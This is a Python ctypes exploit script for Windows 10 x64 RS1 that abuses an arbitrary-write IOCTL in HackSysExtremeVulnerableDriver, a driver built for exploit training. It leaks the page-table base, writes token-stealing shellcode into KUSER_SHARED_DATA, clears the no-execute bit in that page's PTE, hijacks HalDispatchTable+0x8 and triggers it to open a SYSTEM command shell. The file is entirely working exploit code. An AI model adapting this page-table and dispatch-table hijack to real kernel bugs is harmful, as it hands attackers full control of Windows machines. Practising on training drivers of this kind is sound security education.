# Refer to https://connormcgarr.github.io/pte-overwrites/ with python3
# KUSER_SHARED_DATA + 0x800 overwrite
# Tested on Windows 10 x64 RS1 (Version 1607)

import struct
import sys
import os
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Defining KUSER_SHARED_DATA (This is fixed in the Windows 10 x64 RS1)
KUSER_SHARED_DATA = 0xFFFFF78000000000

class WriteWhatWhere_PTE_Base(Structure):
    _fields_ = [
        ("What_PTE_Base", c_void_p),
        ("Where_PTE_Base", c_void_p)
    ]

class WriteWhatWhere_Shellcode_1(Structure):
    _fields_ = [
        ("What_Shellcode_1", c_void_p),
        ("Where_Shellcode_1", c_void_p)
    ]

class WriteWhatWhere_Shellcode_2(Structure):
    _fields_ = [
        ("What_Shellcode_2", c_void_p),
        ("Where_Shellcode_2", c_void_p)
    ]

class WriteWhatWhere_Shellcode_3(Structure):
    _fields_ = [
        ("What_Shellcode_3", c_void_p),
        ("Where_Shellcode_3", c_void_p)
    ]

class WriteWhatWhere_Shellcode_4(Structure):
    _fields_ = [
        ("What_Shellcode_4", c_void_p),
        ("Where_Shellcode_4", c_void_p)
    ]

class WriteWhatWhere_Shellcode_5(Structure):
    _fields_ = [
        ("What_Shellcode_5", c_void_p),
        ("Where_Shellcode_5", c_void_p)
    ]

class WriteWhatWhere_Shellcode_6(Structure):
    _fields_ = [
        ("What_Shellcode_6", c_void_p),
        ("Where_Shellcode_6", c_void_p)
    ]

class WriteWhatWhere_Shellcode_7(Structure):
    _fields_ = [
        ("What_Shellcode_7", c_void_p),
        ("Where_Shellcode_7", c_void_p)
    ]

class WriteWhatWhere_Shellcode_8(Structure):
    _fields_ = [
        ("What_Shellcode_8", c_void_p),
        ("Where_Shellcode_8", c_void_p)
    ]

class WriteWhatWhere_Shellcode_9(Structure):
    _fields_ = [
        ("What_Shellcode_9", c_void_p),
        ("Where_Shellcode_9", c_void_p)
    ]

class WriteWhatWhere_PTE_Control_Bits(Structure):
    _fields_ = [
        ("What_PTE_Control_Bits", c_void_p),
        ("Where_PTE_Control_Bits", c_void_p)
    ]

class WriteWhatWhere_PTE_Overwrite(Structure):
    _fields_ = [
        ("What_PTE_Overwrite", c_void_p),
        ("Where_PTE_Overwrite", c_void_p)
    ]

class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

base = (c_ulonglong * 1024)()

print("[+] Calling EnumDeviceDrivers()...")
get_drivers = psapi.EnumDeviceDrivers(
    byref(base),
    sizeof(base),
    byref(c_long())
)

if not base:
    print("[+] EnumDeviceDrivers() function call failed!")
    sys.exit(-1)

# The first entry in the array with device drivers is ntoskrnl base address
kernel_address = base[0]

print(f"[+] ntoskrnl.exe base address: {hex(kernel_address)}")

# Phase 1: Grab the base of the PTEs via nt!MiGetPteAddress

nt_mi_get_pte_address = kernel_address + 0x51214 # Offset is different on your machine

print(f"[+] nt!MiGetPteAddress is located at: {hex(nt_mi_get_pte_address)}")

pte_base = nt_mi_get_pte_address + 0x13

print(f"[+] nt!MiGetPteAddress+0x13 is located at: {hex(pte_base)}")

base_of_ptes_pointer = c_void_p()

www_pte_base = WriteWhatWhere_PTE_Base()
www_pte_base.What_PTE_Base = pte_base
www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
www_pte_pointer = pointer(www_pte_base)

handle = kernel32.CreateFileA(
    b"\\\\.\\HackSysExtremeVulnerableDriver",
    0xC0000000,
    0,
    None,
    0x3,
    0,
    None
)

# 0x22200B = IOCTL to TriggerArbitraryOverwrite()
kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_pte_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

# CTypes way of extracting value from a C void pointer
base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]

print(f"[+] Base of PTEs are located at: {hex(base_of_ptes)}")

# Phase 2: Calculate KUSER_SHARED_DATA's PTE address

# Calculating the PTE for KUSER_SHARED_DATA + 0x800
kuser_shared_data_800_pte_address = KUSER_SHARED_DATA + 0x800 >> 9
kuser_shared_data_800_pte_address &= 0x7ffffffff8
kuser_shared_data_800_pte_address += base_of_ptes

print(f"[+] PTE for KUSER_SHARED_DATA + 0x800 is located at {hex(kuser_shared_data_800_pte_address)}")

# Phase 3: Write shellcode to KUSER_SHARED_DATA + 0x800

first_shellcode = c_ulonglong(0x00018825048B4865)

www_shellcode_one = WriteWhatWhere_Shellcode_1()
www_shellcode_one.What_Shellcode_1 = addressof(first_shellcode)
www_shellcode_one.Where_Shellcode_1 = KUSER_SHARED_DATA + 0x800
www_shellcode_one_pointer = pointer(www_shellcode_one)

print("[+] Writing first 8 bytes of shellcode to KUSER_SHARED_DATA + 0x800...")

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_shellcode_one_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

second_shellcode = c_ulonglong(0x000000B8808B4800)

www_shellcode_two = WriteWhatWhere_Shellcode_2()
www_shellcode_two.What_Shellcode_2 = addressof(second_shellcode)
www_shellcode_two.Where_Shellcode_2 = KUSER_SHARED_DATA + 0x808
www_shellcode_two_pointer = pointer(www_shellcode_two)

print("[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x808...")

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_shellcode_two_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

third_shellcode = c_ulonglong(0x02F09B8B48C38948)

www_shellcode_three = WriteWhatWhere_Shellcode_3()
www_shellcode_three.What_Shellcode_3 = addressof(third_shellcode)
www_shellcode_three.Where_Shellcode_3 = KUSER_SHARED_DATA + 0x810
www_shellcode_three_pointer = pointer(www_shellcode_three)

print("[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x810...")

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_shellcode_three_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

# Next 8 bytes
fourth_shellcode = c_ulonglong(0x0002F0EB81480000)

www_shellcode_four = WriteWhatWhere_Shellcode_4()
www_shellcode_four.What_Shellcode_4 = addressof(fourth_shellcode)
www_shellcode_four.Where_Shellcode_4 = KUSER_SHARED_DATA + 0x818
www_shellcode_four_pointer = pointer(www_shellcode_four)

print("[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x818...")

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_shellcode_four_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

# Next 8 bytes
fifth_shellcode = c_ulonglong(0x000002E88B8B4800)

www_shellcode_five = WriteWhatWhere_Shellcode_5()
www_shellcode_five.What_Shellcode_5 = addressof(fifth_shellcode)
www_shellcode_five.Where_Shellcode_5 = KUSER_SHARED_DATA + 0x820
www_shellcode_five_pointer = pointer(www_shellcode_five)

print("[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x820...")

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_shellcode_five_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

# Next 8 bytes
sixth_shellcode = c_ulonglong(0x8B48E57504F98348)

www_shellcode_six = WriteWhatWhere_Shellcode_6()
www_shellcode_six.What_Shellcode_6 = addressof(sixth_shellcode)
www_shellcode_six.Where_Shellcode_6 = KUSER_SHARED_DATA + 0x828
www_shellcode_six_pointer = pointer(www_shellcode_six)

print("[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x828...")

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_shellcode_six_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

# Next 8 bytes
seventh_shellcode = c_ulonglong(0xF0E180000003588B)

www_shellcode_seven = WriteWhatWhere_Shellcode_7()
www_shellcode_seven.What_Shellcode_7 = addressof(seventh_shellcode)
www_shellcode_seven.Where_Shellcode_7 = KUSER_SHARED_DATA + 0x830
www_shellcode_seven_pointer = pointer(www_shellcode_seven)

print("[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x830...")

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_shellcode_seven_pointer,       
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

# Next 8 bytes
eighth_shellcode = c_ulonglong(0x4800000358888948)

www_shellcode_eight = WriteWhatWhere_Shellcode_8()
www_shellcode_eight.What_Shellcode_8 = addressof(eighth_shellcode)
www_shellcode_eight.Where_Shellcode_8 = KUSER_SHARED_DATA + 0x838
www_shellcode_eight_pointer = pointer(www_shellcode_eight)

print("[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x838...")

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_shellcode_eight_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

# Last 8 bytes
ninth_shellcode = c_ulonglong(0x0000000000C3C031)
0
www_shellcode_nine = WriteWhatWhere_Shellcode_9()
www_shellcode_nine.What_Shellcode_9 = addressof(ninth_shellcode)
www_shellcode_nine.Where_Shellcode_9 = KUSER_SHARED_DATA + 0x840
www_shellcode_nine_pointer = pointer(www_shellcode_nine)

print("[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x840...")

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_shellcode_nine_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

# Phase 3: Extract KUSER_SHARED_DATA + 0x800's PTE control bits

pte_bits_pointer = c_void_p()

www_pte_bits = WriteWhatWhere_PTE_Control_Bits()
www_pte_bits.What_PTE_Control_Bits = kuser_shared_data_800_pte_address
www_pte_bits.Where_PTE_Control_Bits = addressof(pte_bits_pointer)
www_pte_bits_pointer = pointer(www_pte_bits)

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_pte_bits_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

pte_control_bits_no_execute = struct.unpack('<Q', pte_bits_pointer)[0]

print(f"[+] PTE control bits for KUSER_SHARED_DATA + 0x800: {hex(pte_control_bits_no_execute)}")

# Phase 4: Overwrite current PTE U/S bit for shellcode page with an S (supervisor/kernel)

# Setting KUSER_SHARED_DATA + 0x800 to executable
pte_control_bits_execute = pte_control_bits_no_execute & 0x0FFFFFFFFFFFFFFF

pte_overwrite_pointer = c_void_p(pte_control_bits_execute)

www_pte_overwrite = WriteWhatWhere_PTE_Overwrite()
www_pte_overwrite.What_PTE_Overwrite = addressof(pte_overwrite_pointer)
www_pte_overwrite.Where_PTE_Overwrite = kuser_shared_data_800_pte_address
www_pte_overwrite_pointer = pointer(www_pte_overwrite)

print("[+] Overwriting KUSER_SHARED_DATA + 0x800's PTE...")

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_pte_overwrite_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

# Print update for PTE overwrite round 2
print("[+] KUSER_SHARED_DATA + 0x800 is now executable")

# Phase 5: Shellcode

haldispatchtable_base_address = kernel_address + 0x2f1330 # Offset is different on your machine
haldispatchtable = haldispatchtable_base_address + 0x8

print(f"[+] nt!HalDispatchTable + 0x8 is located at: {hex(haldispatchtable)}")

KUSER_SHARED_DATA_LONGLONG = c_ulonglong(0xFFFFF78000000800)

www = WriteWhatWhere()
www.What = addressof(KUSER_SHARED_DATA_LONGLONG)
www.Where = haldispatchtable
www_pointer = pointer(www)

kernel32.DeviceIoControl(
    handle,
    0x0022200B,
    www_pointer,
    0x8,
    None,
    0,
    byref(c_ulong()),
    None
)

ntdll.NtQueryIntervalProfile(
    0x1234,
    byref(c_ulonglong())
)

print("[+] Execute cmd.exe with SYSTEM privilege")
os.system("cmd.exe /K cd C:\\")

